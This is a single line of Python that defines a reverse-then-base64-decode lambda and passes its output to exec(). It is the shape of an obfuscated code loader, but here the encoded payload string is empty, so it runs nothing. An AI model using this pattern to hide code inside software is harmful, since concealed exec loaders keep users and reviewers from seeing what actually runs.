_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(""))